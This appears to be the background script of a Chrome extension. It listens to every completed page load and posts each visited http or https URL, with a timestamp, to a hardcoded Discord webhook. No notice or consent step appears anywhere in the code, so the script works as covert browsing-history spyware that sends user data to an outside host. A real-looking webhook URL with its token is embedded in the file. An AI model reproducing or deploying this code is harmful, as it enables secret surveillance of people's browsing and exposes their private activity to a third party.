const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1351937979718959137/n4gj7STURnoohr5DCKzGE-nFHLp6U19b-jh7wQRSotlb-hogaJf_Ztf80s0BbZigAtGb";

chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (!details.url.startsWith("http")) return;

  const now = new Date();
  const timestamp = now.toLocaleString(); // Format: "7/6/2025, 8:13:14 PM"

  const payload = {
    content: `🌐 Visited: ${details.url}\n🕒 Time: ${timestamp}`
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("❌ Failed to send to Discord:", err);
  }
}, { url: [{ schemes: ["http", "https"] }] });
